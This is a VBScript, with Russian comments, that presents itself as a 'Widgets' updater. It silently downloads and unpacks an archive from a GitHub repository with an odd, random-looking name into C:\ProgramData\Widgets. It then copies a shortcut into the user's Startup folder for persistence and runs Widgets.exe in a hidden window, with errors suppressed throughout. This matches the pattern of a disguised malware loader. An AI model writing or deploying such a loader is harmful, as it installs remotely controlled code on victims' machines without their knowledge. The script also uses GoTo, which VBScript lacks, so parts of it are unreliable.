On Error Resume Next

Option Explicit

Dim fso, shell, http
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
Set http = CreateObject("MSXML2.XMLHTTP")

Dim targetDir, repoZip, tmpZip, extractDir
targetDir = "C:\ProgramData\Widgets"
repoZip = "https://github.com/MGrinxDev/iyuotkjgrcnuiyftvcp-/archive/refs/heads/main.zip"
tmpZip = targetDir & "\update_temp.zip"
extractDir = targetDir & "\extracted_temp"

If Not fso.FolderExists(targetDir) Then
    fso.CreateFolder targetDir
End If

' === Локальная версия ===
Dim localVerPath, localVer
localVerPath = targetDir & "\version.txt"
localVer = "0.0.0"

If fso.FileExists(localVerPath) Then
    Dim f: Set f = fso.OpenTextFile(localVerPath, 1, False)
    localVer = Trim(f.ReadAll)
    f.Close
End If

' === Удалённая версия ===
Dim remoteVer
http.open "GET", "https://raw.githubusercontent.com/MGrinxDev/iyuotkjgrcnuiyftvcp-/refs/heads/main/version.txt", False
http.send
If http.Status = 200 Then
    remoteVer = Trim(http.responseText)
Else
    remoteVer = localVer
End If

' === Сравнение версий ===
Function IsNewer(v1, v2)
    Dim a1, a2, i
    a1 = Split(v1, ".")
    a2 = Split(v2, ".")
    For i = 0 To 2
        If CInt(a2(i)) > CInt(a1(i)) Then
            IsNewer = True
            Exit Function
        ElseIf CInt(a2(i)) < CInt(a1(i)) Then
            IsNewer = False
            Exit Function
        End If
    Next
    IsNewer = False
End Function

If Not IsNewer(localVer, remoteVer) Then
    GoTo AfterUpdate
End If

' === Скачиваем ZIP ===
http.open "GET", repoZip, False
http.send

If http.Status = 200 Then
    Dim stream: Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile tmpZip, 2
    stream.Close
End If

' === Удаляем всё кроме run.vbs ===
Dim folder, file, subf
Set folder = fso.GetFolder(targetDir)

For Each file In folder.Files
    If LCase(fso.GetFileName(file)) <> "run.vbs" Then
        file.Delete True
    End If
Next

For Each subf In folder.SubFolders
    subf.Delete True
Next

' === Распаковка ===
If Not fso.FolderExists(extractDir) Then fso.CreateFolder(extractDir)

Dim sa: Set sa = CreateObject("Shell.Application")
sa.NameSpace(extractDir).CopyHere sa.NameSpace(tmpZip).Items, 16+4+1024 ' Force overwrite, no UI

' === Перенос содержимого ===
Dim root, item
Set root = fso.GetFolder(extractDir).SubFolders.Item(0)

sa.NameSpace(targetDir).CopyHere sa.NameSpace(root.Path).Items, 16+4+1024

' === Чистим мусор ===
fso.DeleteFolder extractDir, True
fso.DeleteFile tmpZip, True

' === version.txt обновляется сам из архива ===


AfterUpdate:

' === Копируем ярлык в автозагрузку ===
Dim startupPath, sourceFile, targetFile
startupPath = shell.SpecialFolders("Startup")
sourceFile = targetDir & "\run.lnk"
targetFile = startupPath & "\" & fso.GetFileName(sourceFile)

If Not fso.FileExists(targetFile) And fso.FileExists(sourceFile) Then
    fso.CopyFile sourceFile, targetFile, True
End If

' === Запуск Widgets.exe ===
shell.Run "cmd /c " & Chr(34) & targetDir & "\Widgets.exe" & Chr(34), 0, False
